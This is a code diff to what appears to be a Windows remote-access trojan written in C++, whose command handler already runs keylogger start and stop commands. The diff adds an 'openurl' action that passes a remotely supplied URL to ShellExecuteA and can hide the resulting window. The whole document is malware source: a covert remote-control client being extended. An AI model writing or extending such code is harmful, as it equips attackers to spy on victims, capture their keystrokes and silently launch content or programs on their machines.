@@ -2,6 +2,7 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#include <shellapi.h>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -14,6 +15,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib")
+#pragma comment(lib, "shell32.lib")
 
 using json = nlohmann::json;
 using namespace std;
@@ -121,6 +123,14 @@ private:
             }
             else if (action == "keylogstart" || action == "keylogstop") {
                 execute_keylogger_command(data);
+            }
+            else if (action == "openurl") {
+                string url  = data.value("url", "");
+                string mode = data.value("mode", "Visible");
+                int showCmd = SW_SHOWNORMAL;
+                if (mode == "Invisible") showCmd = SW_HIDE;
+
+                ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, showCmd);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
